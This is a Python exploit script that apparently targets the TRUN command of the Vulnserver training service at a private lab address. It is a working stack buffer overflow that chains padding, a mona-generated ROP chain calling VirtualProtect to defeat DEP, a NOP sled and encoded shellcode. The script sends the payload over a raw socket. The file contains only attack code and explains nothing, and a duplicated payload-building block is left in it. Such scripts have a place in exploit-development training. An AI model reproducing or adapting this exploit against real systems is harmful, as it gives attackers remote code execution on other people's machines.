#!/usr/bin/python
import socket, struct, sys
server = '192.168.122.61'
sport = 9999

shellcode =  b""
shellcode += b"\xb8\x60\xef\x10\x6d\xda\xdf\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x5b\x83\xeb\xfc\x31\x43\x10"
shellcode += b"\x03\x43\x10\x82\x1a\xec\x85\xc0\xe5\x0d\x56"
shellcode += b"\xa4\x6c\xe8\x67\xe4\x0b\x78\xd7\xd4\x58\x2c"
shellcode += b"\xd4\x9f\x0d\xc5\x6f\xed\x99\xea\xd8\x5b\xfc"
shellcode += b"\xc5\xd9\xf7\x3c\x47\x5a\x05\x11\xa7\x63\xc6"
shellcode += b"\x64\xa6\xa4\x3a\x84\xfa\x7d\x31\x3b\xeb\x0a"
shellcode += b"\x0f\x80\x80\x41\x9e\x80\x75\x11\xa1\xa1\x2b"
shellcode += b"\x29\xf8\x61\xcd\xfe\x71\x28\xd5\xe3\xbf\xe2"
shellcode += b"\x6e\xd7\x34\xf5\xa6\x29\xb5\x5a\x87\x85\x44"
shellcode += b"\xa2\xcf\x22\xb6\xd1\x39\x51\x4b\xe2\xfd\x2b"
shellcode += b"\x97\x67\xe6\x8c\x5c\xdf\xc2\x2d\xb1\x86\x81"
shellcode += b"\x22\x7e\xcc\xce\x26\x81\x01\x65\x52\x0a\xa4"
shellcode += b"\xaa\xd2\x48\x83\x6e\xbe\x0b\xaa\x37\x1a\xfa"
shellcode += b"\xd3\x28\xc5\xa3\x71\x22\xe8\xb0\x0b\x69\x65"
shellcode += b"\x75\x26\x92\x75\x11\x31\xe1\x47\xbe\xe9\x6d"
shellcode += b"\xe4\x37\x34\x69\x7d\x5f\xc7\xa5\xc5\x0f\x39"
shellcode += b"\x46\x36\x06\xfe\x12\x66\x30\xd7\x1a\xed\xc0"
shellcode += b"\xd8\xce\x98\xca\x4e\x31\xf4\xb0\xe0\xd9\x07"
shellcode += b"\x44\xec\x45\x81\xa2\x5e\x26\xc1\x7a\x1f\x96"
shellcode += b"\xa1\x2a\xf7\xfc\x2d\x15\xe7\xfe\xe7\x3e\x82"
shellcode += b"\x10\x5e\x17\x3b\x88\xfb\xe3\xda\x55\xd6\x8e"
shellcode += b"\xdd\xde\xd3\x6f\x93\x16\x91\x63\xc4\x40\x59"
shellcode += b"\x7b\x15\xe5\x59\x11\x11\xaf\x0e\x8d\x1b\x96"
shellcode += b"\x79\x12\xe3\xfd\xf9\x54\x1b\x80\xcb\x2f\x2a"
shellcode += b"\x16\x74\x47\x53\xf6\x74\x97\x05\x9c\x74\xff"
shellcode += b"\xf1\xc4\x26\x1a\xfe\xd0\x5a\xb7\x6b\xdb\x0a"
shellcode += b"\x64\x3b\xb3\xb0\x53\x0b\x1c\x4a\xb6\x0f\x5b"
shellcode += b"\xb4\x45\x38\xc4\xdd\xb5\x78\xf4\x1d\xdf\x78"
shellcode += b"\xa4\x75\x14\x56\x4b\xb6\xd5\x7d\x04\xde\x5c"
shellcode += b"\x10\xe6\x7f\x61\x39\xa6\x21\x62\xce\x73\xd1"
shellcode += b"\x19\xbf\x84\x12\xde\xa9\xe0\x12\xdf\xd5\x16"
shellcode += b"\x2e\x36\xec\x6c\x71\x8b\x4b\x6e\x6c\x21\xa6"
shellcode += b"\x07\x29\xa0\x0b\x4a\xca\x1f\x4f\x73\x49\x95"
shellcode += b"\x30\x80\x51\xdc\x35\xcc\xd5\x0d\x44\x5d\xb0"
shellcode += b"\x31\xfb\x5e\x91"

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
brk = '\xcc'
padding = 'F' * (3000 - 2006 - 4 - 16 - 1)
attack = prefix + eip + nopsled + brk + padding
def create_rop_chain():

  # rop chain generated with mona.py - www.corelan.be
  rop_gadgets = [
    #[---INFO:gadgets_to_set_esi:---]
    0x7526f022,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
    0x76cefd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_ebp:---]
    0x75263c03,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x625011bb,  # & jmp esp [essfunc.dll]
    #[---INFO:gadgets_to_set_ebx:---]
    0x7529fd06,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0xfffffdff,  # Value to negate, will become 0x00000201
    0x76cd2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    0x76cef9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_edx:---]
    0x752a3836,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0xffffffc0,  # Value to negate, will become 0x00000040
    0x7542dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x74f91110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_ecx:---]
    0x7542d9dd,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x7625df17,  # &Writable location [USP10.dll] ** REBASED ** ASLR
    #[---INFO:gadgets_to_set_edi:---]
    0x752409db,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x753c1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    #[---INFO:gadgets_to_set_eax:---]
    0x75241cf2,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x90909090,  # nop
    #[---INFO:pushad:---]
    0x7664e180,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
brk = '\xcc'
padding = 'F' * (3000 - 2006 - len(rop_chain) - 16 - len(shellcode))
attack = prefix + rop_chain + nopsled + shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
